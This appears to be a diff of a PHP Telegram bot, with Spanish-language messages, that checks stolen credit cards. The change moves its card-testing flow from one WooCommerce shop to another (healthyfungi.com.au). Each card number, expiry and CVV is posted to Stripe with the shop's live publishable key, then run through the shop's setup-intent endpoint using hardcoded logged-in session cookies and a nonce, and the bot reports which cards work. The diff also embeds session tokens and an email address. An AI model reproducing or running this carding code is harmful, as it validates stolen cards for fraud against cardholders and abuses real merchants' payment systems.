@@ -1531,7 +1531,7 @@ editMessage($chat_id,$respuesta,$id_text);
 
 
 
-elseif((strpos($message, "!dr") === 0)||(strpos($message, "/dr") === 0)||(strpos($message, ".dr") === 0)){
+elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){
 
 $lista = substr($message, 4);
 $i     = explode("|", $lista);
@@ -1555,7 +1555,7 @@ die();
 
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
 }else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .par c";
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .he cc|m|y|cvv\n";
 sendMessage($chat_id,$respuesta, $message_id);
 die();
 }
@@ -1568,54 +1568,11 @@ sendMessage($chat_id,$respuesta, $message_id);
 $id_text = file_get_contents("ID");
 //----------------------------------------------------//
 
-
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 
 
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://dream-beat.com/my-account/add-payment-method/',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'wordpress_logged_in_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C3b57db40d69d43229f38fb563c6d0c7d3c2d6cee57d85f3b0ea1b9ae544b543b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
-//    'Accept-Encoding: gzip, deflate, br, zstd',
-    'accept-language: es-US,es;q=0.8',
-    'referer: https://dream-beat.com/my-account/payment-methods/',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-
-curl_close($curl);
-
-$partes = explode('"createSetupIntentNonce":"', $response);
-$nonce = explode('"', $partes[1]);
-$nonce = $nonce[0];
-//    echo "Nonce: $nonce\n";
-
-$partes = explode('"publishableKey":"', $response);
-$pk_live = explode('"', $partes[1]);
-$pk_live = $pk_live[0];
-//    echo "PK Live: $pk_live\n";
-
-
-$partes = explode('"accountId":"', $response);
-$accountId = explode('"', $partes[1]);
-$accountId = $accountId[0];
-//    echo "Account ID: $accountId\n";
-
-
-$curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -1624,14 +1581,11 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=+&billing_details%5Bemail%5D=rigoj777%40gmail.com&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bpostal_code%5D=10001&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fbcadf22de5%3B+stripe-js-v3%2Fbcadf22de5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fdream-beat.com&time_on_page=25084&client_attribution_metadata%5Bclient_session_id%5D=0e2942e8-ef40-4a97-b13d-a4f4aa04560d&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=0b2b11eb-7cad-40df-a9e1-ced1b24447a7658a4b&sid=NA&key='.$pk_live.'&_stripe_account='.$accountId.'',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bcountry%5D=MX&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=17309&client_attribution_metadata%5Bclient_session_id%5D=6935060f-fb91-48e7-afdb-4cee8ac5121b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1PLz1dC08E2V4AsU',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
-//    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/x-www-form-urlencoded',
-    'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.8',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
   ],
@@ -1639,18 +1593,18 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+
 curl_close($curl);
+
 $json = json_decode($response, true);
 $id = $json['id'];
 
-//echo "$id\n";
-///Verifica la targeta///
-
-
+//echo "$response\n";
+//echo "$id";
 $curl = curl_init();
 
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://dream-beat.com/wp-admin/admin-ajax.php',
+  CURLOPT_URL => 'https://healthyfungi.com.au/wp-admin/admin-ajax.php',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
@@ -1660,25 +1614,23 @@ curl_setopt_array($curl, [
   CURLOPT_POSTFIELDS => [
     'action' => 'create_setup_intent',
     'wcpay-payment-method' => ''.$id.'',
-    '_ajax_nonce' => ''.$nonce.'',
+    '_ajax_nonce' => 'f86e826140',
   ],
-  CURLOPT_COOKIE => 'wordpress_sec_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C7007d67acd788bd65648956c0ef7cd5ffb2e28c6177de5d216dcf3f543129b20; __stripe_mid=0b2b11eb-7cad-40df-a9e1-ced1b24447a7658a4b; wordpress_logged_in_16be603727c326eebbb2512f82748386=rigoj777%7C1727365195%7C4zf5xzJfSKsZLQfpKAvQALvRES9qQYwgCPRR6nXKKh9%7C3b57db40d69d43229f38fb563c6d0c7d3c2d6cee57d85f3b0ea1b9ae544b543b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-09-12%2015%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=13hyew4tnc%7C1728317435%7Chm9hrRb5CVAXP3t6g7U372Br5Ug9trZZk4P7J74Pjof%7C4558cd19e3b44f5ae555c718302765f935ea06aa631d6d479518967b3c381273; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-23%2016%3A02%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-23%2016%3A02%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=13hyew4tnc%7C1728317435%7Chm9hrRb5CVAXP3t6g7U372Br5Ug9trZZk4P7J74Pjof%7Ce542d47bda552d92d5f0ee756645277082e95b703818dae2e31ab15ab816c0b2; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-//    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
-  //  'content-type: multipart/form-data; boundary=----WebKitFormBoundarybzbH8meLO1Xw42Mf',
-    'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.8',
-    'origin: https://dream-beat.com',
-    'referer: https://dream-beat.com/my-account/add-payment-method/',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryq0CuTOkn0wEdeJr7',
+//    'accept-language: es-US,es;q=0.7',
+    'origin: https://healthyfungi.com.au',
+    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
   ],
 ]);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
+curl_close($curl);
+
 //------------------------------------------//
 //$message = $json['data']['error']['message'];
 $message = str_replace("Error: ", "", $json['data']['error']['message']);
@@ -1697,6 +1649,7 @@ if ($success === true && $status === "succeeded") {
 } else {
     $respo = $message;
 }
+	
 
 
 $timetakeen = (microtime(true) - $startTime);
